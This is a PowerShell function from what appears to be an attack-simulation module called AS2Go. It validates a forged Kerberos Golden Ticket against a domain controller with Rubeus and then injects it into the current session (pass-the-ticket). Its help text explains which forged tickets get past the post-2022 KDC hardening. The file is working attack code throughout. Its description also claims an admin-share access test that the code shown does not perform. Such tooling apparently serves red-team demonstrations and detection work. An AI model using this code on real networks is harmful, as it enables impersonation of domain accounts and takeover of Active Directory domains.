<#
.SYNOPSIS
Validates and injects a .kirbi Kerberos ticket file with Rubeus.

.DESCRIPTION
Displays the ticket details with Rubeus describe, requests a service ticket with the ticket against a
selected domain controller to validate it against the hardened KDC (PAC requestor enforcement), injects
the ticket with Rubeus ptt on confirmation, and tests access to the domain controller admin share.
Returns $true when the KDC accepted the ticket, otherwise $false.

For Golden Tickets forged with Mimikatz, the hardened KDC (post-November 2022 patches) rejects the
ticket with KDC_ERR_TGT_REVOKED because the forged PAC has no PAC_REQUESTOR structure. Rubeus golden
tickets include the requestor structure and are accepted. The validation step makes this difference
observable before any injection occurs.

.PARAMETER TicketFile
Path to the .kirbi file to validate and inject.

.PARAMETER Service
Service Principal Name used for the TGS-REQ validation, for example cifs/<DC-FQDN>.

.PARAMETER DomainController
Domain controller used for the TGS-REQ validation.

.EXAMPLE
Import-KirbiFile -TicketFile "C:\Temp\gt.kirbi" -Service "cifs/DC01.corp.local" -DomainController "DC01.corp.local"
Validates and injects the Golden Ticket file.

.INPUTS
None. This function does not declare pipeline input.

.OUTPUTS
System.Boolean. $true when the KDC accepted the ticket, otherwise $false.

.NOTES
Private AS2Go function. Run from an initialized AS2Go module session.
Requires Rubeus.exe in the configured tools path and a valid .kirbi file.

.COMPONENT
Category: Sub Function

.FUNCTIONALITY
Validates a .kirbi ticket against the hardened KDC with Rubeus describe and asktgs, then injects it
with Rubeus ptt and tests domain controller admin-share access. Makes KDC_ERR_TGT_REVOKED rejection
of requestor-less forged tickets observable before injecting.
#>
Function Import-KirbiFile {

    Param(
        [Parameter(Mandatory)]
        [string]$TicketFile,

        [Parameter(Mandatory)]
        [string]$Service,

        [Parameter(Mandatory)]
        [string]$DomainController
    )

    $Info = Measure-FunctionRuntime -Begin

    $Rubeus = Join-Path -Path $Script:ASTools -ChildPath "Rubeus.exe"

    If (-not (Test-Path -Path $TicketFile)) {
        Write-AS2GoOutput -Type Error -Message "Ticket file '$TicketFile' does not exist."
        Measure-FunctionRuntime -End -Details $Info
        return $false
    }

    If (-not (Test-Path -Path $Rubeus)) {
        Write-AS2GoOutput -Type Error -Message "Rubeus.exe not found in '$Script:ASTools'."
        Measure-FunctionRuntime -End -Details $Info
        return $false
    }

    Write-AS2GoOutput -Type Header -Message "Describe the forged ticket"
    Write-AS2GoOutput -Type CodeSnippet -Message "Command:"

    Write-Highlight -Text ".\Rubeus.exe ", "describe", " /ticket:", $TicketFile `
        -Color $fgcC, $fgcV, $fgcS, $fgcV
    Write-Host ""

    & $Rubeus describe /ticket:"$TicketFile" 2>&1 | Out-Host
    Write-Host ""

    If ($UnAttended) { Start-Sleep 2 } else { Pause }

    If (-not $SkipClearHost) { Clear-Host }

    Write-AS2GoOutput -Type Header -Message "Validate the forged ticket against the hardened KDC"
    Write-AS2GoOutput -Type Info -Message "A TGS-REQ with the ticket validates it without injecting it. Since the November 2022 KDC hardening, Domain Controllers reject forged tickets without a PAC_REQUESTOR structure (KDC_ERR_TGT_REVOKED). Mimikatz forges such tickets; current Rubeus versions include the structure."

    Write-AS2GoOutput -Type CodeSnippet -Message "Command:"

    Write-Highlight -Text ".\Rubeus.exe ", "asktgs", " /ticket:", $TicketFile, " /service:", $Service, " /dc:", $DomainController, " /nowrap" `
        -Color $fgcC, $fgcV, $fgcS, $fgcV, $fgcS, $fgcV, $fgcS, $fgcV, $fgcS
    Write-Host ""

    $tgsOutput = & $Rubeus asktgs /ticket:"$TicketFile" /service:"$Service" /dc:"$DomainController" /nowrap 2>&1 | Out-String

    $tgsOutput | Out-Host
    Write-Host ""

    $accepted = if ($tgsOutput -match 'KRB-ERROR') { $false } else { $true }

    If ($accepted) {
        Write-AS2GoOutput -Type Success -Message "KDC accepted the ticket for service '$Service'."
    }
    else {
        $errorDetail = [regex]::Match($tgsOutput, 'KRB-ERROR[^:]*:\s*(?<Code>.+)').Value
        If ([string]::IsNullOrWhiteSpace($errorDetail)) {
            Write-AS2GoOutput -Type Error -Message "KDC rejected the ticket for service '$Service'. Review the output above."
        }
        else {
            Write-AS2GoOutput -Type Error -Message "KDC rejected the ticket for service '$Service': $errorDetail. A hardened KDC rejects Mimikatz-forged tickets lacking a PAC_REQUESTOR structure."
        }
        Measure-FunctionRuntime -End -Details $Info
        return $false
    }

    Write-AS2GoOutput -Type CodeSnippet -Message "Command to inject the validated ticket:"

    Write-Highlight -Text ".\Rubeus.exe ", "ptt", " /ticket:", $TicketFile `
        -Color $fgcC, $fgcV, $fgcS, $fgcV
    Write-Host ""

    $answer = Show-DecisionPrompt -Title "Inject the validated ticket" -Message "Inject '$TicketFile' into the current logon session?"

    If ($answer -ne $Script:Yes) {
        Measure-FunctionRuntime -End -Details $Info
        return $true
    }

    & $Rubeus ptt /ticket:"$TicketFile" 2>&1 | Out-Host

    Write-AS2GoOutput -Type Info -Message "The injected ticket stays in the cache; 'Kdc Called' remains empty because the ticket was injected without a KDC exchange."

    If ($UnAttended) { Start-Sleep 2 } else { Pause }

    Measure-FunctionRuntime -End -Details $Info
    return $true
}